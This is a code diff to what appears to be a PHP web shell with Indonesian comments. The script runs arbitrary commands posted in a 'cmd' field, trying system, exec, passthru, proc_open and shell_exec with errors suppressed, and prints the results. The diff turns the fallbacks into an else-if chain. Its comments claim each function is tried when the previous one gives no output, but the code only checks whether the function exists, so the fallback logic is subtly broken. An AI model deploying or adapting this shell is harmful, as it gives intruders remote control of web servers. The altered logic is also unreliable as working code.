@@ -419,45 +419,36 @@ if (isset($_POST['cmd'])) {
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
             echo "</div>";
-            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
-
-    // Cek dan gunakan exec()
-    if (function_exists('exec')) {
+    // Cek dan gunakan exec() jika system() tidak ada output
+    else if (function_exists('exec')) {
         $results = [];
         @exec($cmd, $results, $resultCode);
         if (!empty($results)) {
             $output = implode("\n", $results);
-            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
             echo "</div>";
-            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
-
-    // Cek dan gunakan passthru()
-    if (function_exists('passthru')) {
+    // Cek dan gunakan passthru() jika exec() tidak ada output
+    else if (function_exists('passthru')) {
         @ob_start();
         @passthru($cmd, $resultCode);
         $output = @ob_get_contents();
         @ob_end_clean();
         if (!empty($output)) {
-            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
             echo "</div>";
-            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
-
-    // Cek dan gunakan proc_open()
-    if (function_exists('proc_open')) {
+    // Cek dan gunakan proc_open() jika passthru() tidak ada output
+    else if (function_exists('proc_open')) {
         $descriptorspec = [
             0 => ["pipe", "r"],  // stdin
             1 => ["pipe", "w"],  // stdout
@@ -471,32 +462,27 @@ if (isset($_POST['cmd'])) {
             @fclose($pipes[2]);
             $resultCode = @proc_close($process);
             if (!empty($output)) {
-                // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
                 echo "<pre>Result Code: $resultCode</pre>";
                 echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                 echo "</div>";
-                return; // Hentikan eksekusi fungsi setelah berhasil
             }
         }
     }
-
-    // Cek dan gunakan shell_exec()
-    if (function_exists('shell_exec')) {
+    // Cek dan gunakan shell_exec() jika proc_open() tidak ada output
+    else if (function_exists('shell_exec')) {
         $output = @shell_exec($cmd);
         $resultCode = ($output === null) ? 1 : 0; // Jika output null, anggap gagal
         if (!empty($output)) {
-            // Menampilkan hasil dan menghentikan eksekusi lebih lanjut
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
             echo "</div>";
-            return; // Hentikan eksekusi fungsi setelah berhasil
         }
     }
-
-    // Jika tidak ada output yang berhasil
-    echo "<pre>Result Code: $resultCode</pre>";
-    echo "<pre>No output generated or command failed.</pre>";
-    echo "</div>";
+    else {
+        echo "<pre>Result Code: $resultCode</pre>";
+        echo "<pre>No output generated or command failed.</pre>";
+        echo "</div>";
+    }
 }
 
         // Create a new file
